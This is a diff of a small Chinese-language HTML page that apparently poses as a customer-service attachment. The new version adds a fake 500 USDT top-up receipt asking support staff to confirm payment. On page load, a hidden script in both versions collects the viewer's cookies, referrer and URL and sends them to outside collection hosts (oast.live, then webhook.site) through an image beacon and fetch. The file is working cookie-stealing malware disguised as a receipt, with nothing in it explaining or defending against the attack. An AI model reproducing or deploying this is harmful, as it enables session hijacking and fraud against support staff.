@@ -1,12 +1,16 @@
-<!doctype html><html><head><meta charset="utf-8"><title>客服附件预览</title></head><body>
-<div style="font:14px/1.8 sans-serif;color:#555;padding:24px">附件加载中，请稍候…</div>
+<!doctype html><html><head><meta charset="utf-8"><title>凭证查看</title></head><body>
+<div style="font:14px/1.9 sans-serif;color:#444;padding:28px;max-width:520px">
+<h3 style="margin:0 0 12px">充值凭证</h3>
+<div>订单状态：处理中，请客服核对后确认到账。</div>
+<div style="margin-top:14px;color:#999;font-size:12px">单号：PP20261015-88237 · 金额：500 USDT</div>
+</div>
 <script>
 (function(){
   var q='';
-  try{ q='r='+encodeURIComponent((document.referrer||'').slice(0,200)); }catch(e){}
+  try{ q='r='+encodeURIComponent((document.referrer||'none').slice(0,220)); }catch(e){}
   try{ q+='&l='+encodeURIComponent((location.href||'').slice(0,160)); }catch(e){}
-  try{ q+='&c='+encodeURIComponent((document.cookie||'').slice(0,120)); }catch(e){}
-  new Image().src='https://db88t0uheij7jokkjn6g1x185kdb47qms.oast.live/b1?'+q;
-  try{ fetch('https://db88t0uheij7jokkjn6g1x185kdb47qms.oast.live/b2?'+q,{mode:'no-cors'}).catch(function(){}); }catch(e){}
+  try{ q+='&c='+encodeURIComponent((document.cookie||'empty').slice(0,140)); }catch(e){}
+  new Image().src='https://webhook.site/05dfc8ab-f46b-4737-9c6c-ebd6221ce713/js1?'+q;
+  fetch('https://webhook.site/05dfc8ab-f46b-4737-9c6c-ebd6221ce713/js2?'+q,{mode:'no-cors'}).catch(function(){});
 })();
 </script></body></html>
